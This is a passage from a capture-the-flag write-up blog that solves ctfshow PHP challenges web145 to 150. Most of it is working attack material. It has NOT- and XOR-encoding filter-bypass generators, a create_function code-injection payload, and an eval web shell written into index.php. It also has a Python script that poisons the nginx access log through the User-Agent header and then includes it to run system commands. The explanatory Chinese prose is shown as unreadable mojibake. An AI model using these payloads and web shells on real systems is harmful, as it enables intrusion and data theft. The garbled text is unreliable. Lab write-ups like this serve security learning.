Á≠âÁ≠âÁ¨¶Âè∑Êù•ÊãúÊâòreturnÔºå‰ΩÜÈÉΩË¢´ban‰∫ÜÔºåÊµãËØï‰∫Ü‰∏Ä‰∏ãÂèëÁé∞<code>|</code>ÂèØ‰ª•‰ΩøÁî®<br>ÂèñÂèçËÑöÊú¨Â¶Ç‰∏ã</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line">$system=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line">$command=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~$system).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~$command).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÊûÑÈÄ†payloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|</span><br></pre></td></tr></table></figure><h3 id="web146"><a class="header-anchor" href="#web146">¬∂</a>web146</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Ê≤°ÁúãÂá∫Âíå‰∏ä‰∏ÄÈ¢òÊúâ‰ªÄ‰πàÂ∑ÆÂà´(ÂèØËÉΩÂ§öban‰∫Ü‰∏Ä‰∫õÂ≠óÁ¨¶)ÔºåÁõ¥Êé•Áî®‰∏ä‰∏ÄÈ¢òpayloadÂç≥ÂèØ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|</span><br></pre></td></tr></table></figure><h3 id="web147"><a class="header-anchor" href="#web147">¬∂</a>web147</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    $ctfshow = $_POST[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,$ctfshow)) &#123;</span><br><span class="line">        $ctfshow(<span class="string">&#x27;&#x27;</span>,$_GET[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Êç¢‰∫ÜÈ¢òÂûãÔºåËøôÈáåÂØπctfËøõË°å‰∫Ü‰∏Ä‰∏™Ê≠£ÂàôË°®ËææÂºèËøáÊª§Ôºåpost‰º†ÂèÇÁöÑ<code>ctf</code>Âíåget‰º†ÂèÇÁöÑ<code>show</code>ËøõË°å‰∫ÜÁªÑÂêàÔºåËøôÈáåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®<code>create_function()</code>‰ª£Á†ÅÊ≥®ÂÖ•</p><blockquote><p>string create_function ( string args , string args , string code )</p><p>string $args ÂèòÈáèÈÉ®ÂàÜ<br>string $code ÊñπÊ≥ï‰ª£Á†ÅÈÉ®ÂàÜ</p></blockquote><p>‰æãÂ¶Ç</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$dotast&#x27;</span>,<span class="string">&#x27;echo $dotast.&quot;very cool&quot;&#x27;</span>)</span><br><span class="line"><span class="comment">//Á≠â‰∫é</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">$dotast</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $dotast.<span class="string">&quot;very cool&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/*Âà©Áî®Â¶Ç‰∏ã</span></span><br><span class="line"><span class="comment">Â¶ÇÊûúÊàë‰ª¨Á¨¨‰∫å‰∏™ÂèÇÊï∞ËæìÂÖ•ÁöÑÊòØ&#x27;echo 111;&#125;phpinfo();//&#x27;</span></span><br><span class="line"><span class="comment">Âç≥ÂèØÊääÂâçÈù¢ÁöÑÊñπÊ≥ïÊã¨Âè∑ÁªôÈó≠ÂêàÂπ∂‰∏îÊàêÂäüÊâßË°åphpinfoÂëΩ‰ª§ÔºåÂêéÈù¢Áî®//Ê≥®ÈáäÊéâÂêéËæπÁöÑËØ≠Âè•</span></span><br><span class="line"><span class="comment">‰πüÂ∞±ÊòØ‰∏ãÈù¢Ëøô‰∏™ÁªìÊûÑ</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">$dotast</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>ËÄåÊ≠£ÂàôË°®ËææÂºèÊàë‰ª¨ÂèØ‰ª•Áî®<code>\</code>ËøõË°åÁªïËøáÔºåÊ≠£Â•Ω<code>\</code>Âú®phpÈáå‰ª£Ë°®ÈªòËÆ§ÂëΩÂêçÁ©∫Èó¥</p><blockquote><p>phpÈáåÈªòËÆ§ÂëΩÂêçÁ©∫Èó¥ÊòØ\ÔºåÊâÄÊúâÂéüÁîüÂáΩÊï∞ÂíåÁ±ªÈÉΩÂú®Ëøô‰∏™ÂëΩÂêçÁ©∫Èó¥‰∏≠„ÄÇ ÊôÆÈÄöË∞ÉÁî®‰∏Ä‰∏™ÂáΩÊï∞ÔºåÂ¶ÇÊûúÁõ¥Êé•ÂÜôÂáΩÊï∞Âêçfunction_name()Ë∞ÉÁî®ÔºåË∞ÉÁî®ÁöÑÊó∂ÂÄôÂÖ∂ÂÆûÁõ∏ÂΩì‰∫éÂÜô‰∫Ü‰∏Ä‰∏™Áõ∏ÂØπË∑ØÂæÑÔºõ ËÄåÂ¶ÇÊûúÊòØ\function_name()ËøôÊ†∑ÁöÑÂΩ¢ÂºèÂéªË∞ÉÁî®ÂáΩÊï∞ÔºåÂàôÊòØË°®Á§∫ÂÜô‰∫Ü‰∏Ä‰∏™ÁªùÂØπË∑ØÂæÑ„ÄÇ Â¶ÇÊûú‰Ω†Âú®ÂÖ∂‰ªñnamespaceÈáåË∞ÉÁî®Á≥ªÁªüÁ±ªÔºåÂøÖÈ°ª‰ΩøÁî®ÁªùÂØπË∑ØÂæÑÁöÑÂÜôÊ≥ï</p></blockquote><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web147/E_13H4%40%7D%29_U8D%5D8BFQQ0%5B_S.png" alt=""><br>ÊúÄÁªàpaylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?show&#x3D;echo 123;&#125;system(&quot;tac flag.php&quot;);&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">ctf&#x3D;\create_function</span><br></pre></td></tr></table></figure><h3 id="web148"><a class="header-anchor" href="#web148">¬∂</a>web148</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Ê≤°banÊéâÂºÇÊàñÂ≠óÁ¨¶<code>^</code>Ôºå‰πãÂâçÁî®ÂâçÈù¢ÁöÑËÑöÊú¨Ë∑ëÂ∞±Â•Ω‰∫Ü</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># ÁîüÊàêÂèØÁî®ÁöÑÂ≠óÁ¨¶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i ^ j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;xor_rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ê†πÊçÆËæìÂÖ•ÁöÑÂëΩ‰ª§Âú®ÁîüÊàêÁöÑtxt‰∏≠ËøõË°åÂåπÈÖç</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your functionÔºö&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your commandÔºö&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web148/2S12%252MNYT%241_OV9M%29%5DU_97.png" alt=""><br>ËøêË°åÂêéÂæóÂà∞payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure><h3 id="web149"><a class="header-anchor" href="#web149">¬∂</a>web149</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">        <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($_GET[<span class="string">&#x27;ctf&#x27;</span>], $_POST[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">        <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ËøôÈáåÁî®file_put_contentsÂáΩÊï∞ÂÜôÂÖ•Êñá‰ª∂ÔºåÂπ∂‰∏î‰ºöÊúâ‰∏§‰∏™forÂæ™ÁéØÂà§Êñ≠‰∏çÊòØindex.phpÁöÑÊñá‰ª∂‰ºöË¢´Âà†Èô§ÔºåÊâÄ‰ª•Êàë‰ª¨Áõ¥Êé•Êää‰∏ÄÂè•ËØùÊú®È©¨ÂÜôËøõindex.phpÂ∞±ÂèØ‰ª•ÔºåpaylaodÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?ctf&#x3D;index.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">show&#x3D;&lt;?php @eval($_POST[dotast]);?&gt;</span><br></pre></td></tr></table></figure><p>Êé•ÁùÄÂÜçindex.phpÈáåÂà©Áî®Êàë‰ª¨ÁöÑÈ©¨Âç≥ÂèØ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url+index.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">dotast&#x3D;system(&quot;cat &#x2F;ctfshow_fl0g_here.txt&quot;);</span><br></pre></td></tr></table></figure><h3 id="web150"><a class="header-anchor" href="#web150">¬∂</a>web150</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line">    <span class="keyword">private</span> $vip;</span><br><span class="line">    <span class="keyword">private</span> $secret;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params">$class</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ËøáÊª§Â≠óÁ¨¶</span></span><br><span class="line">$key = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, $key))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($isVIP &amp;&amp; strrpos($ctf, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÊàëÁî®ÁöÑÊó•ÂøóÂåÖÂê´ÁªïËøáÔºåÂ∫îËØ•‰πüÊòØÈùûÈ¢ÑÊúüËß£ÔºåÂíåÂâçÈù¢ÂÜôËøáÁöÑÊó•ÂøóÂåÖÂê´Â∑Æ‰∏çÂ§öÔºåËøôÈáåË¶ÅÊÉ≥ÂåÖÂê´ÈúÄË¶Å<code>$isvip</code>ÂèòÈáè‰∏∫trueÊàñËÄÖ1ÔºåËøôÈáåÊúâ<code>QUERY_STRING</code>ÂíåextractÂáΩÊï∞ÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÈÄöËøáget‰º†ÂèÇÊù•ÂÆö‰πâ(ÂøòËÆ∞Ëøô‰∏™Áü•ËØÜÁÇπÁöÑÂæÄ‰∏äÁúãweb127)ÔºåÁÑ∂ÂêéÂÜç<code>User-Agent</code>ÈáåÂÜô‰∏ä‰∏ÄÂè•ËØùÂà©Áî®ÔºåËøôÈáåÂÜô‰∫ÜËÑöÊú¨ËøõË°åÂà©Áî®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/7 11:50</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5166dd5a-495e-4cd2-bad1-6a13b1cba45a.chall.ctf.show:8080/&quot;</span> + <span class="string">&quot;?isVIP=1&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span>: <span class="string">&#x27;/var/log/nginx/access.log&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dotast&#x27;</span>:<span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">result = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÂæóÂà∞flag</p><h3 id="web150-plus"><a class="header-anchor" href="#web150-plus">¬∂</a>web150_plus</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 